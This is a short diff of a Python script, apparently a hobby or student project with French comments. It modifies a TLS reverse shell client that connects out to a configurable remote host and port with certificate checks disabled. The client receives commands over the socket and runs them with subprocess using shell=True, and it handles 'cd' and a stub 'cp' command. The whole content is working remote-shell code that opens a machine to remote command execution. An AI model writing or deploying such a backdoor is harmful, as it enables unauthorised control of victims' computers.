@@ -12,6 +12,10 @@ import ssl
 import subprocess
 import os
 
+# /!\ MODIFIER @ HOST AVANT D'EXECUTER LE PROGRAMME
+HOST = '192.168.1.6'
+PORT = 25566
+
 # Create a TCP/IP socket
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
@@ -21,7 +25,7 @@ context.check_hostname = False
 context.verify_mode = ssl.CERT_NONE
 
 wrappedSocket = context.wrap_socket(sock, server_hostname='localhost')
-wrappedSocket.connect(('localhost', 1234))
+wrappedSocket.connect((HOST, PORT))
 
 try:
    while True:
@@ -36,8 +40,11 @@ try:
         if len(cmd) >= 2:
             if cmd[0] == "cd" or cmd[0] == "CD":
                 os.chdir(cmd[1])
-                output = "changed directory to {}".format(cmd[1])
+                # à supprimer (debug)
+                output = "Changed directory to {}".format(cmd[1])
                 wrappedSocket.sendall(output.encode())
+            elif cmd[0] == "cp" or cmd[0] == "CP":
+                print(cmd)
             else:
                 command = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, 
                                        stderr=subprocess.PIPE)
